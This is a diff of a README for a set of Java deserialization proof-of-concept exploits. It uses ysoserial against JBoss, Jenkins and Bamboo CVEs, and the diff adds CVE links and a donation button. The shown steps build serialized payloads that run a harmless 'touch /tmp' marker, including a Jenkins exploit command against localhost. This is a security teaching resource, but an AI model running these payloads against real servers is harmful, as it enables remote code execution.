@@ -1,6 +1,9 @@
+# Java Deserialization Of Untrusted Data
 Here there are practical examples of the - deserialization of untrusted data - vulnerability.
 
 These pocs use the [ysoserial](https://github.com/frohoff/ysoserial/) tool to generate exploits.
+
+<a href="https://www.buymeacoffee.com/edoardovignati" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee"  width="20%"></a>
 
 # Pocs
 
@@ -31,6 +34,7 @@ JBOSS (CVE-2016-7065)
 - In Burp "paste from file" and choose JbossPayload.ser
 - Checkout in /tmp folder the execution of "touch /tmp/JbossVulnerable.txt"
 
+https://www.vulmon.com/vulnerabilitydetails?qid=CVE-2016-7065&scoretype=cvssv2
 
 
 Jenkins (CVE-2015-8103)
@@ -41,6 +45,8 @@ Jenkins (CVE-2015-8103)
 java -jar ./jenkins-war-1.649.war
 java -cp ysoserial-master-v0.0.5-gb617b7b-16.jar ysoserial.exploit.JenkinsListener http://localhost:8080 CommonsCollections5 "touch /tmp/JenkinsVulnerable.txt"
 ```
+
+https://www.vulmon.com/vulnerabilitydetails?qid=CVE-2015-8103&scoretype=cvssv2
 
 
 Bamboo (CVE-2015-6576)
@@ -57,6 +63,8 @@ Bamboo (CVE-2015-6576)
 ```java -jar ysoserial.jar CommonsCollections4 "touch /tmp/BambooVulnerable.txt" > BambooPayload.ser ```
   or use the payload inside the folder JBoss
 
+https://www.vulmon.com/vulnerabilitydetails?qid=CVE-2015-6576&scoretype=cvssv2
+	
 
 # Ysoserial stacktraces
 
